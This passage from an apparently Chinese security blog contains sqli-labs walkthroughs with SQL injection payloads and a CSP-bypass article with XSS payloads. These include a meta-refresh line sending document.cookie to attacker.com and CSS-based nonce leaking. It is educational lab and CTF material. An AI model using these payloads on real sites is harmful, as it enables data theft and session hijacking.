<h2 id="Less-41（堆叠注入）"><a href="#Less-41（堆叠注入）" class="headerlink" title="Less-41（堆叠注入）"></a>Less-41（堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同 less-39 区别于无报错信息</span><br></pre></td></tr></table></figure>



<h2 id="Less-42（堆叠注入）"><a href="#Less-42（堆叠注入）" class="headerlink" title="Less-42（堆叠注入）"></a>Less-42（堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名做了转义处理，可以对密码进行堆叠注入</span><br><span class="line"></span><br><span class="line">login_user=1&amp;login_password=1&#x27;;create table less42 like users#</span><br></pre></td></tr></table></figure>



<h2 id="Less-43（堆叠注入）"><a href="#Less-43（堆叠注入）" class="headerlink" title="Less-43（堆叠注入）"></a>Less-43（堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-42，只是多了个括号</span><br><span class="line"></span><br><span class="line">login_user=1&amp;login_password=1&#x27;);create table less43 like users#</span><br></pre></td></tr></table></figure>



<h2 id="Less-44（堆叠注入）"><a href="#Less-44（堆叠注入）" class="headerlink" title="Less-44（堆叠注入）"></a>Less-44（堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同 less-42 只是没有报错信息</span><br></pre></td></tr></table></figure>



<h2 id="Less-45（堆叠注入）"><a href="#Less-45（堆叠注入）" class="headerlink" title="Less-45（堆叠注入）"></a>Less-45（堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同 less-43 只是没有报错信息</span><br></pre></td></tr></table></figure>



<h2 id="Less-46（order-by-注入）"><a href="#Less-46（order-by-注入）" class="headerlink" title="Less-46（order by 注入）"></a>Less-46（order by 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此题可考虑报错注入和延时注入：</span><br><span class="line">1. 直接添加注入语句，?sort=(select ******)；</span><br><span class="line">2. 利用一些函数。例如rand()函数等。?sort=rand(sql语句)，对比rand(ture)和rand(false)的结果，可以判断是否注入成功；</span><br><span class="line">3. 利用and，例如?sort=1 and (加sql语句)。</span><br><span class="line"></span><br><span class="line">报错注入：</span><br><span class="line"></span><br><span class="line">?sort=1 and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;~&#x27;))--+</span><br><span class="line"></span><br><span class="line">?sort=1 and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),&#x27;~&#x27;))--+</span><br><span class="line"></span><br><span class="line">?sort=1 and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(password) from users),&#x27;~&#x27;))--+</span><br><span class="line"></span><br><span class="line">延时注入例子 :</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-46/?sort=(SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5(&#x27;1&#x27;)),null) FROM (select database() as current) as tb1)</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-46/?sort=1 and If(ascii(substr(database(),1,1))=116,0,sleep(5))</span><br></pre></td></tr></table></figure>



<h2 id="Less-47-（order-by-注入）"><a href="#Less-47-（order-by-注入）" class="headerlink" title="Less-47 （order by 注入）"></a>Less-47 （order by 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-46 只是多了一个单引号</span><br></pre></td></tr></table></figure>



<h2 id="Less-48（order-by-盲注）"><a href="#Less-48（order-by-盲注）" class="headerlink" title="Less-48（order by 盲注）"></a>Less-48（order by 盲注）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-46 无报错信息，所以需要盲注</span><br><span class="line">如：</span><br><span class="line">?sort=1 and if(length(database())=8,sleep(4),1)--+</span><br><span class="line">?sort=1 and if(ascii(left(database(),1))=115,sleep(4),1)--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-49（order-by-盲注）"><a href="#Less-49（order-by-盲注）" class="headerlink" title="Less-49（order by 盲注）"></a>Less-49（order by 盲注）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-48 多了一个单引号</span><br></pre></td></tr></table></figure>



<h2 id="Less-50（order-by-堆叠注入）"><a href="#Less-50（order-by-堆叠注入）" class="headerlink" title="Less-50（order by 堆叠注入）"></a>Less-50（order by 堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这题使用 mysqli_multi_query 函数，所以可以执行多个语句。</span><br><span class="line"></span><br><span class="line">?sort=1;create table less50 like users -- +</span><br><span class="line">/?sort=1;insert into users(id,username,password)value(18,&#x27;less50&#x27;,&#x27;less50&#x27;)#</span><br></pre></td></tr></table></figure>



<h2 id="Less-51（order-by-堆叠注入）"><a href="#Less-51（order-by-堆叠注入）" class="headerlink" title="Less-51（order by 堆叠注入）"></a>Less-51（order by 堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-50 多了一个单引号</span><br></pre></td></tr></table></figure>



<h2 id="Less-52（order-by-堆叠注入）"><a href="#Less-52（order-by-堆叠注入）" class="headerlink" title="Less-52（order by 堆叠注入）"></a>Less-52（order by 堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同 less-50 没有了注释</span><br></pre></td></tr></table></figure>



<h2 id="Less-53（order-by-堆叠注入）"><a href="#Less-53（order-by-堆叠注入）" class="headerlink" title="Less-53（order by 堆叠注入）"></a>Less-53（order by 堆叠注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同 less-51 没有了注释</span><br></pre></td></tr></table></figure>



<h2 id="Less-54（挑战1）"><a href="#Less-54（挑战1）" class="headerlink" title="Less-54（挑战1）"></a>Less-54（挑战1）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">依旧是字符型注入，只不过只有十次机会，密码就在 secret 列名里面</span><br></pre></td></tr></table></figure>



<h2 id="Less-55（挑战2）"><a href="#Less-55（挑战2）" class="headerlink" title="Less-55（挑战2）"></a>Less-55（挑战2）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-54 加了一个括号</span><br></pre></td></tr></table></figure>



<h2 id="Less-56（挑战3）"><a href="#Less-56（挑战3）" class="headerlink" title="Less-56（挑战3）"></a>Less-56（挑战3）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-54 加了一个单引号括号</span><br></pre></td></tr></table></figure>



<h2 id="Less-57（挑战4）"><a href="#Less-57（挑战4）" class="headerlink" title="Less-57（挑战4）"></a>Less-57（挑战4）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-54 加了一个双引号</span><br></pre></td></tr></table></figure>



<h2 id="Less-58（挑战5）"><a href="#Less-58（挑战5）" class="headerlink" title="Less-58（挑战5）"></a>Less-58（挑战5）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union 注入失败，但是可以进行报错注入，这次是单引号型的</span><br></pre></td></tr></table></figure>



<h2 id="Less-59（挑战6）"><a href="#Less-59（挑战6）" class="headerlink" title="Less-59（挑战6）"></a>Less-59（挑战6）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-58 这次是纯数字型</span><br></pre></td></tr></table></figure>



<h2 id="Less-60（挑战7）"><a href="#Less-60（挑战7）" class="headerlink" title="Less-60（挑战7）"></a>Less-60（挑战7）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-58 这次是双引号括号型的</span><br></pre></td></tr></table></figure>



<h2 id="Less-61（挑战8）"><a href="#Less-61（挑战8）" class="headerlink" title="Less-61（挑战8）"></a>Less-61（挑战8）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类似 less-58 这次真的猜不出...原来是单引号加两层括号...</span><br></pre></td></tr></table></figure>



<h2 id="Less-62（挑战9）"><a href="#Less-62（挑战9）" class="headerlink" title="Less-62（挑战9）"></a>Less-62（挑战9）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单引号括号型，但是 union 注入和报错注入已经失效，页面信息也没有变化</span><br><span class="line">所以只能进行时间盲注</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PRACTICE</tag>
      </tags>
  </entry>
  <entry>
    <title>CSP nonce&amp;strict-dynamic Bypass</title>
    <url>/2021/02/17/nonce-strict-dynamic-bypass/</url>
    <content><![CDATA[<p>关于CSP中nonce&amp;strict-dynamic机制分析和绕过</p>
<span id="more"></span>

<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><p>众所周知，CSP的默认策略是不允许inline脚本执行，想要运行inline脚本需要进行如下设置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Security</span>-<span class="title class_">Policy</span>: script-src <span class="string">&#x27;unsafe-inline&#x27;</span></span><br></pre></td></tr></table></figure>

<p>但是为了防止恶意脚本的注入，CSP引入了nonce机制和script-dynamic机制</p>
<h2 id="探究nonce机制"><a href="#探究nonce机制" class="headerlink" title="探究nonce机制"></a>探究nonce机制</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>参考<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">MDN的标准</a></p>
<blockquote>
<p><strong>nonce-&lt;base64-value&gt;</strong></p>
<p>An allow-list for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy. It is critical to provide an unguessable nonce, as bypassing a resource’s policy is otherwise trivial. See <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script">unsafe inline script</a> for an example. Specifying nonce makes a modern browser ignore <code>&#39;unsafe-inline&#39;</code> which could still be set for older browsers without nonce support.</p>
<p><strong>Note:</strong> The CSP <code>nonce</code> source can only be apply <em>nonceable</em> elements (e.g. as the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img"><code>&lt;img&gt;</code></a> element has no <code>nonce</code> attribute, there is no way to associate it with this CSP source).</p>
</blockquote>
<p>使用一个随机<code>nonce</code>来控制白名单，即可允许执行脚本，所以需要确保<code>nonce</code>是随机生成的，而且这个<code>nonce</code>会忽略<code>unsafe-inline</code>属性</p>
<p><strong>例子</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Security</span>-<span class="title class_">Policy</span>: script-src <span class="string">&#x27;nonce-test&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 可以执行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 不能执行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="常见绕过思路"><a href="#常见绕过思路" class="headerlink" title="常见绕过思路"></a>常见绕过思路</h3><h4 id="浏览器自动补全"><a href="#浏览器自动补全" class="headerlink" title="浏览器自动补全"></a><strong>浏览器自动补全</strong></h4><blockquote>
<p>Firefox、IE成功，Chrome失败</p>
</blockquote>
<p>如果在nonce上方存在XSS注入，则可以直接通过标签闭合使nonce成为自己的属性</p>
<p>实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection:0&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">&#x27;test&#x27;</span>&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?xss=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/plain,alert(1)</span></span></span><br></pre></td></tr></table></figure>

<h4 id="Base-uri绕过"><a href="#Base-uri绕过" class="headerlink" title="Base-uri绕过"></a><strong>Base-uri绕过</strong></h4><p>如果base-uri没有被设置，那我们可以使用<code>&lt;base&gt;</code>将文档的基础uri改为自己的服务器，引入自定义的js文件</p>
<p>例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;base href=<span class="string">&quot;//attacker.com&quot;</span>&gt;</span><br><span class="line">&lt;script nonce=<span class="string">&#x27;test&#x27;</span> src=<span class="string">&quot;/main.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="meta标签绕过"><a href="#meta标签绕过" class="headerlink" title="meta标签绕过"></a><strong>meta标签绕过</strong></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1;url=http://attacker.com/receive.php?c=&quot;</span>+<span class="attr">escape</span>(<span class="attr">document.cookie</span>)) &gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="浏览器缓存绕过"><a href="#浏览器缓存绕过" class="headerlink" title="浏览器缓存绕过"></a><strong>浏览器缓存绕过</strong></h4><p>具体步骤可参考这篇<a href="https://www.freebuf.com/articles/web/133455.html">文章</a></p>
<p>攻击能够实现的原因有2个：</p>
<ul>
<li>浏览器开启了缓存，只修改location.hash不会请求服务器，给我们能够窃取nonce的机会</li>
<li>利用iframe标签窃取nonce并实现任意XSS</li>
</ul>
<h4 id="输出缓冲区溢出绕过"><a href="#输出缓冲区溢出绕过" class="headerlink" title="输出缓冲区溢出绕过"></a><strong>输出缓冲区溢出绕过</strong></h4><p>实例源于<a href="https://github.com/justcatthefish/justctf-2020/tree/master/challenges/web_baby-csp">justCTF 2020 babyCSP</a></p>
<blockquote>
<p>因为在官方靶机复现的时候最后没打到admin那，本地搭环境发现要用域名在google注册reCAPTCHA服务，所以下面主要是讲绕过CSP nonce的部分</p>
</blockquote>
<p>题目核心代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;secrets.php&quot;</span>);</span><br><span class="line"><span class="variable">$nonce</span> = <span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">isAdmin</span>())&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-Content-Type-Options: nosniff&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: text/html; charset=UTF-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;You are not an admin!&quot;</span>;</span><br><span class="line">     <span class="keyword">die</span>();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">10</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;alg&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$_nonce</span> = <span class="title function_ invoke__">hash</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;alg&#x27;</span>], <span class="variable">$nonce</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_nonce</span>)&#123;</span><br><span class="line">            <span class="variable">$nonce</span> = <span class="variable">$_nonce</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$nonce</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$nonce</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) &lt;= <span class="number">23</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-security-policy: default-src &#x27;none&#x27;; style-src &#x27;nonce-<span class="subst">$nonce</span>&#x27;; script-src &#x27;nonce-<span class="subst">$nonce</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">        &lt;script nonce=&#x27;<span class="subst">$nonce</span>&#x27;&gt;</span></span><br><span class="line"><span class="string">            setInterval(</span></span><br><span class="line"><span class="string">                ()=&gt;user.style.color=Math.random()&lt;0.3?&#x27;red&#x27;:&#x27;black&#x27;</span></span><br><span class="line"><span class="string">            ,100);</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;center&gt;&lt;h1&gt; Hello &lt;span id=&#x27;user&#x27;&gt;<span class="subst">&#123;$_GET[&#x27;user&#x27;]&#125;</span>&lt;/span&gt;!!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Click &lt;a href=&quot;?flag&quot;&gt;here&lt;/a&gt; to get a flag!&lt;/p&gt;</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Found a bug? We want to hear from you! /bugbounty.php</span></span><br><span class="line"><span class="comment">// Check /Dockerfile</span></span><br></pre></td></tr></table></figure>

<p>漏洞的核心在于在执行<code>header()</code>之前会对nonce进行计算，hash的seed可控且无长度限制，当我们输入alg参数时，页面会输出warning</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515253cef4728db75de5a220c.png" alt="image-20210215102946344"></p>
<p>参考PHP文档的<a href="https://www.php.net/manual/en/outcontrol.configuration.php#outcontrol.configuration">Runtime Configuration</a></p>
<blockquote>
<p><code>output_buffering</code> bool&#x2F;int</p>
<p>You can enable output buffering for all files by setting this directive to ‘On’. If you wish to limit the size of the buffer to a certain size - you can use a maximum number of bytes instead of ‘On’, as a value for this directive (e.g., output_buffering&#x3D;4096). This directive is always Off in PHP-CLI.</p>
</blockquote>
<p>PHP具有多个种类的输出缓冲区，输出缓冲区默认大小是<strong>4096 bytes</strong>，HTTP缓冲区负责存储HTTP Header和HTTP Body，如果缓冲区超过最大限制就会强制刷新，所以只要我们输入的alg参数足够长，就能导致缓冲区溢出，从而使header修改失败</p>
<blockquote>
<p>注意CLI的输出缓冲区比较特别，CLI会将INI配置中的<em>output_buffer</em>选项强制设置为0，这表示禁用默认PHP输出缓冲区</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515255cf45fd8fa67cb1ec1b4.png" alt="image-20210215105539720"></p>
<p>在web中查看，你可以再一次确定输出缓冲区默认大小是<strong>4096 bytes</strong></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102151525a2fdf924894d84bc0d1c.png" alt="image-20210215105440404"></p>
<p>注入足够长度的参数header就会无法修改从而绕过CSP，此时插入XSS便能攻击成功</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515258ef91bc2f07f0249024d.png" alt="image-20210215140908083"></p>
<p>所以前半部分的payload如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    name=<span class="string">&quot;fetch(&#x27;?flag&#x27;).then(e=&gt;e.text()).then(alert)&quot;</span></span></span><br><span class="line"><span class="language-javascript">    location = <span class="string">&#x27;https://127.0.0.1:10001/?user=%3Csvg%20onload=eval(name)%3E&amp;alg=&#x27;</span>+<span class="string">&#x27;a&#x27;</span>.<span class="title function_">repeat</span>(<span class="string">&#x27;292&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="探究strict-dynamic机制"><a href="#探究strict-dynamic机制" class="headerlink" title="探究strict-dynamic机制"></a>探究strict-dynamic机制</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>参考<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">MDN的标准</a></p>
<blockquote>
<p><strong>strict-dynamic</strong></p>
<p>The <code>strict-dynamic</code> source expression specifies that the trust explicitly given to a script present in the markup, by accompanying it with a nonce or a hash, shall be propagated to all the scripts loaded by that root script. At the same time, any allow-list or source expressions such as <code>&#39;self&#39;</code> or <code>&#39;unsafe-inline&#39;</code> are ignored. See <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#strict-dynamic">script-src</a> for an example.</p>
</blockquote>
<p><code>strict-dynamic</code>规定需要给可执行脚本一个明确的<code>nonce</code>或者<code>hash</code>，防止因为白名单存在相关漏洞而被引入恶意脚本，同时也会忽略<code>self</code>和<code>unsafe-inline</code>属性，<code>strict-dynamic</code>可让我们动态插入满足<code>nonce</code>的可执行脚本</p>
<p><strong>例子</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Security</span>-<span class="title class_">Policy</span>: script-src <span class="string">&#x27;nonce-test&#x27;</span> <span class="string">&#x27;strict-dynamic&#x27;</span> example.<span class="property">com</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//example.com/assets/A.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 可以执行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//example.com/assets/B.js&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 不能执行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="常见绕过思路-1"><a href="#常见绕过思路-1" class="headerlink" title="常见绕过思路"></a>常见绕过思路</h3><h4 id="通过CSS泄露nonce"><a href="#通过CSS泄露nonce" class="headerlink" title="通过CSS泄露nonce"></a><strong>通过CSS泄露nonce</strong></h4><p>主要参考这篇<a href="http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html">文章</a>，可以说一种侧信道攻击</p>
<p>CSS攻击原理都一样，先进行匹配然后通过url进行回显，具体就不多说了</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// <span class="number">1</span></span><br><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;a&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=a&quot;</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;b&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=b&quot;</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;c&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=c&quot;</span>)&#125;</span><br><span class="line"><span class="selector-attr">[...]</span></span><br><span class="line"></span><br><span class="line">// <span class="number">2</span></span><br><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;aa&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=aa&quot;</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;ab&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=ab&quot;</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^=<span class="string">&quot;ac&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;record?match=ac&quot;</span>)&#125;</span><br><span class="line"><span class="selector-attr">[...]</span></span><br></pre></td></tr></table></figure>

<h4 id="Script-Gadget"><a href="#Script-Gadget" class="headerlink" title="Script Gadget"></a><strong>Script Gadget</strong></h4><p>使用某个HTML或者JS文件中现存的特定的JS代码来绕过CSP，这个是我们本次学习的重点</p>
<h2 id="Script-Gadget-1"><a href="#Script-Gadget-1" class="headerlink" title="Script Gadget"></a>Script Gadget</h2><blockquote>
<p>参考2017年blackhat的《<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">Breaking XSS mitigations via Script Gadgets</a>》</p>
<p>Github: <a href="https://github.com/google/security-research-pocs">https://github.com/google/security-research-pocs</a></p>
</blockquote>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p><strong>在HTML代码中</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">&quot;button&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-text</span>=<span class="string">&quot;I am a button&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">var</span> buttons = $(<span class="string">&quot;[data-role=button]&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> buttons.<span class="title function_">html</span>(button.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-text&quot;</span>)); <span class="comment">// 注入点</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以可以构造如下语句进行注入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">&quot;button&quot;</span> <span class="attr">data-text</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>在JS代码中</strong></p>
<p>以Knockout Gadget为例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取data-bind属性</span></span><br><span class="line"><span class="keyword">switch</span> (node.<span class="property">nodeType</span>) &#123;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">return</span> node.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-bind&quot;</span>);</span><br><span class="line"><span class="comment">// 写入到rewrittenBindings</span></span><br><span class="line"><span class="keyword">var</span> rewrittenBindings = ko.<span class="property">expressionRewriting</span>.<span class="title function_">preProcessBindings</span>(bindingsString, options),</span><br><span class="line"> functionBody = <span class="string">&quot;with($context)&#123;with($data||&#123;&#125;)&#123;return&#123;&quot;</span> + rewrittenBindings + <span class="string">&quot;&#125;&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;$context&quot;</span>, <span class="string">&quot;$element&quot;</span>, functionBody);</span><br><span class="line"><span class="comment">// 